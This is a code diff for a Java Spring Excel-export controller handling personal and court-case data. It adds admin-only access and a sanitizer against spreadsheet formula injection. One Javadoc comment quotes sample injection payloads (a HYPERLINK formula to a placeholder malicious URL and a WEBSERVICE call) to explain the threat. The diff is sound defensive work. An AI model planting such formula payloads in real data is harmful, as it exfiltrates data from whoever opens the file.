@@ -16,6 +16,7 @@ import org.apache.poi.xssf.usermodel.XSSFWorkbook;
 import org.springframework.http.HttpHeaders;
 import org.springframework.http.MediaType;
 import org.springframework.http.ResponseEntity;
+import org.springframework.security.access.prepost.PreAuthorize;
 import org.springframework.web.bind.annotation.*;
 
 import java.io.ByteArrayOutputStream;
@@ -33,6 +34,9 @@ import java.util.stream.Collectors;
 @RequiredArgsConstructor
 @Tag(name = "Exportação", description = "Endpoints para exportação de dados em Excel")
 @Slf4j
+// Exporta a base inteira com CPF/RG/endereço — maior vetor de exfiltração de dados
+// pessoais em massa (LGPD). Nível de classe: vale para todos os endpoints daqui.
+@PreAuthorize("hasRole('ADMIN')")
 public class ExportacaoController {
 
     private final CustodiadoRepository custodiadoRepository;
@@ -324,27 +328,40 @@ public class ExportacaoController {
     /**
      * Preenche colunas 0-6: dados pessoais + endereço do custodiado.
      */
+    /**
+     * Neutraliza CSV/Formula Injection. Um campo salvo como =HYPERLINK("http://malicioso",…)
+     * ou @WEBSERVICE(…) é interpretado como FÓRMULA quando o servidor abre a planilha —
+     * exfiltrando dados ou disparando requisição na máquina de quem abriu. Prefixar com
+     * apóstrofo força o Excel/LibreOffice a tratar como texto literal.
+     */
+    static String protegerFormula(String valor) {
+        if (valor == null || valor.isEmpty()) return valor;
+        char inicio = valor.charAt(0);
+        return (inicio == '=' || inicio == '+' || inicio == '-' || inicio == '@'
+                || inicio == '\t' || inicio == '\r') ? "'" + valor : valor;
+    }
+
     private void preencherDadosCustodiado(Row row, Custodiado custodiado,
                                            HistoricoEndereco endereco,
                                            CellStyle dataStyle, CellStyle centerStyle) {
         // Col 0: Nome
         Cell nome = row.createCell(0);
-        nome.setCellValue(custodiado.getNome());
+        nome.setCellValue(protegerFormula(custodiado.getNome()));
         nome.setCellStyle(dataStyle);
 
         // Col 1: CPF
         Cell cpf = row.createCell(1);
-        cpf.setCellValue(custodiado.getCpf() != null ? custodiado.getCpf() : "—");
+        cpf.setCellValue(custodiado.getCpf() != null ? protegerFormula(custodiado.getCpf()) : "—");
         cpf.setCellStyle(centerStyle);
 
         // Col 2: RG
         Cell rg = row.createCell(2);
-        rg.setCellValue(custodiado.getRg() != null ? custodiado.getRg() : "—");
+        rg.setCellValue(custodiado.getRg() != null ? protegerFormula(custodiado.getRg()) : "—");
         rg.setCellStyle(centerStyle);
 
         // Col 3: Contato
         Cell contato = row.createCell(3);
-        contato.setCellValue(custodiado.getContato() != null ? custodiado.getContato() : "—");
+        contato.setCellValue(custodiado.getContato() != null ? protegerFormula(custodiado.getContato()) : "—");
         contato.setCellStyle(centerStyle);
 
         // Col 4: Endereço (logradouro + número + complemento)
@@ -356,7 +373,7 @@ public class ExportacaoController {
             if (endereco.getComplemento() != null && !endereco.getComplemento().isBlank()) {
                 end.append(", ").append(endereco.getComplemento());
             }
-            enderecoCell.setCellValue(end.toString());
+            enderecoCell.setCellValue(protegerFormula(end.toString()));
         } else {
             enderecoCell.setCellValue("Não informado");
         }
@@ -365,14 +382,14 @@ public class ExportacaoController {
         // Col 5: Bairro
         Cell bairro = row.createCell(5);
         bairro.setCellValue(endereco != null && endereco.getBairro() != null
-                ? endereco.getBairro() : "—");
+                ? protegerFormula(endereco.getBairro()) : "—");
         bairro.setCellStyle(dataStyle);
 
         // Col 6: Cidade/UF
         Cell cidadeUf = row.createCell(6);
         if (endereco != null && endereco.getCidade() != null) {
             String uf = endereco.getEstado() != null ? "/" + endereco.getEstado() : "";
-            cidadeUf.setCellValue(endereco.getCidade() + uf);
+            cidadeUf.setCellValue(protegerFormula(endereco.getCidade() + uf));
         } else {
             cidadeUf.setCellValue("—");
         }
@@ -388,17 +405,17 @@ public class ExportacaoController {
                                          CellStyle conformidadeStyle) {
         // Col 7: Número do processo
         Cell numProc = row.createCell(7);
-        numProc.setCellValue(processo.getNumeroProcesso());
+        numProc.setCellValue(protegerFormula(processo.getNumeroProcesso()));
         numProc.setCellStyle(dataStyle);
 
         // Col 8: Vara
         Cell vara = row.createCell(8);
-        vara.setCellValue(processo.getVara() != null ? processo.getVara() : "—");
+        vara.setCellValue(processo.getVara() != null ? protegerFormula(processo.getVara()) : "—");
         vara.setCellStyle(dataStyle);
 
         // Col 9: Comarca
         Cell comarca = row.createCell(9);
-        comarca.setCellValue(processo.getComarca() != null ? processo.getComarca() : "—");
+        comarca.setCellValue(processo.getComarca() != null ? protegerFormula(processo.getComarca()) : "—");
         comarca.setCellStyle(dataStyle);
 
         // Col 10: Status (com cor condicional)
